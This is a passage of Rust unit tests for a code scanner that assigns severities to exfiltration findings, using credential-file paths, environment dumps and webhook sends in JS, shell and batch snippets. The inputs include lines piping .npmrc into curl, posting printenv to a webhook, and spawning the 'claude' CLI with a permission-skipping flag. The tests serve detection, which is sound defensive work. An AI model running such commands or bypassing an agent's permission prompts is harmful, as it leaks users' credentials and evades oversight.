    fn a_reached_file_keeps_a_comment_a_bind_spec_and_a_dump_with_no_flow_at_medium() {
        let send = "fetch('https://example.invalid/up');\n";
        let comment = format!("// reads {NPMRC}\n{send}");
        let bind = format!(
            "const args = ['run', '-v', `${{process.env['X']}}:/root/{}`];\nfs.readFileSync('package.json');\n{send}",
            ".npmrc"
        );
        let shell = format!(
            "docker run -v $HOME/.npmrc:/root/.npmrc img\ncat notes.txt\ncurl {WEBHOOK_SITE}\n"
        );
        let far_dump = format!(
            "const e = JSON.stringify(process.env);\n{}fetch(u);\n",
            "// filler\n".repeat(40)
        );
        for (text, rule) in [
            (comment, "exfil.cred-path"),
            (bind, "exfil.cred-path"),
            (far_dump, "exfil.env-dump"),
        ] {
            let mut v = run("src/c.js", FileKind::Code(Lang::Js), &text);
            assert_eq!(one(&v, rule).severity, Severity::Medium, "{text}");
            raise_reached(&mut v, &|_| true);
            assert_eq!(one(&v, rule).severity, Severity::Medium, "{text}");
        }
        let mut v = run("run.sh", FileKind::Code(Lang::Sh), &shell);
        assert_eq!(one(&v, "exfil.cred-path").severity, Severity::Medium);
        raise_reached(&mut v, &|_| true);
        assert_eq!(one(&v, "exfil.cred-path").severity, Severity::Medium);
    }

    #[test]
    fn a_credential_path_in_a_bind_or_mount_spec_is_not_a_read() {
        // vscode shape (build/npm/postinstall): a docker run argv that mounts the npm config of
        // the host into the container, passes a token with -e, and sits near other reads and sends.
        let argv = format!(
            "const args = [\n  'run',\n  ...fs.readFileSync('flags.txt', 'utf8').split('\\n'),\n  '-v', `${{process.env['NPMRC_PATH']}}:/root/{}`,\n  '-e', 'GITHUB_TOKEN',\n  image,\n];\nspawn('docker', args);\nfetch('https://example.invalid/status');\n",
            ".npmrc"
        );
        let v = code(Lang::Js, &argv);
        assert_eq!(one(&v, "exfil.cred-path").severity, Severity::Medium);
        for line in [
            "docker run -v ~/.npmrc:/root/.npmrc img",
            "docker run --volume $HOME/.npmrc:/root/.npmrc img",
            "docker run --mount type=bind,source=/h/x,target=/root/.npmrc img",
            "docker run --mount type=bind,source=~/.npmrc,target=/c img",
        ] {
            let t = format!("cat versions.txt\n{line}\ncurl https://example.invalid/\n");
            let v = code(Lang::Sh, &t);
            assert_eq!(
                one(&v, "exfil.cred-path").severity,
                Severity::Medium,
                "{line}"
            );
        }
    }

    #[test]
    fn a_path_that_is_the_argument_of_a_read_is_high() {
        let send = "fetch('https://example.invalid/up');\n";
        for read in [
            format!("const k = fs.readFileSync('{NPMRC}');"),
            format!("const k = readFile('{NPMRC}');"),
            format!("k = open('{NPMRC}').read()"),
            format!("const k = fs.readSync(fd, '{NPMRC}');"),
            format!("k = File.read('{NPMRC}')"),
            format!("k, _ := os.ReadFile(\"{NPMRC}\")"),
            format!("k = Path('{NPMRC}').read_text()"),
        ] {
            let t = format!("{read}\n{send}");
            let v = code(Lang::Js, &t);
            assert_eq!(
                one(&v, "exfil.cred-path").severity,
                Severity::High,
                "{read}"
            );
        }
        for sh in [
            format!("cat {NPMRC} | curl -d @- https://example.invalid/"),
            format!("curl -d \"$(<{NPMRC})\" https://example.invalid/"),
            format!("curl -d @- https://example.invalid/ < {NPMRC}"),
        ] {
            let v = code(Lang::Sh, &sh);
            assert_eq!(one(&v, "exfil.cred-path").severity, Severity::High, "{sh}");
        }
        let bat = format!("type {NPMRC}\ncurl https://example.invalid/\n");
        assert_eq!(
            one(&code(Lang::Bat, &bat), "exfil.cred-path").severity,
            Severity::High
        );
        // The word `type` is not a read outside a batch file.
        let ts = format!("type A = {{ p: '{NPMRC}' }};\n{send}");
        assert_eq!(
            one(&code(Lang::Js, &ts), "exfil.cred-path").severity,
            Severity::Medium
        );
    }

    #[test]
    fn raising_a_reached_file_touches_only_medium_exfil_findings() {
        let mut mediums = vec![Finding {
            severity: Severity::Medium,
            group: Group::Hidden,
            rule: "hidden.zero-width".to_string(),
            path: "src/a.file".to_string(),
            line: 1,
            why: String::new(),
            seen: String::new(),
            action: String::new(),
            count: 1,
        }];
        raise_reached(&mut mediums, &|_| true);
        assert_eq!(mediums[0].severity, Severity::Medium);
    }

    #[test]
    fn a_nul_or_a_stray_byte_in_a_comment_does_not_hide_a_rule() {
        // The scan decodes lossily: a NUL stays, an invalid byte becomes U+FFFD. Every rule
        // still reads the text.
        let env = "// pad\0\u{FFFD}\nfetch('https://example.invalid/', { body: JSON.stringify(process.env) });\n";
        let v = code(Lang::Js, env);
        assert_eq!(one(&v, "exfil.env-dump").severity, Severity::High);
        let ai = format!(
            "/* \0 */\nconst {{ spawn }} = require('child_process');\nspawn('claude', ['{SKIP_PERMS}', '-p', p]);\n"
        );
        let v = code(Lang::Js, &ai);
        assert_eq!(one(&v, "exfil.ai-cli-abuse").severity, Severity::High);
        let hook = format!("# \0\ncurl -d \"$(printenv)\" {WEBHOOK_SITE}\n");
        let v = code(Lang::Sh, &hook);
        assert_eq!(one(&v, "exfil.webhook").severity, Severity::High);
    }

    #[test]
    fn no_exfil_rule_runs_on_a_doc() {
        let t = format!("{DISCORD}\n{SSH_KEY}\n{STRATUM}\nJSON.stringify(process.env) fetch\n");
        assert!(run("README.md", FileKind::Doc, &t).is_empty());
    }

    #[test]
    fn a_file_that_is_not_text_is_skipped() {
        let f = FileCtx {
            path: "a.js",
            bytes: b"\xff\xfe",
            text: None,
            kind: FileKind::Code(Lang::Js),
            truncated: false,
        };
        let mut out = Vec::new();
        check(&f, &mut out);
        assert!(out.is_empty());
    }
}
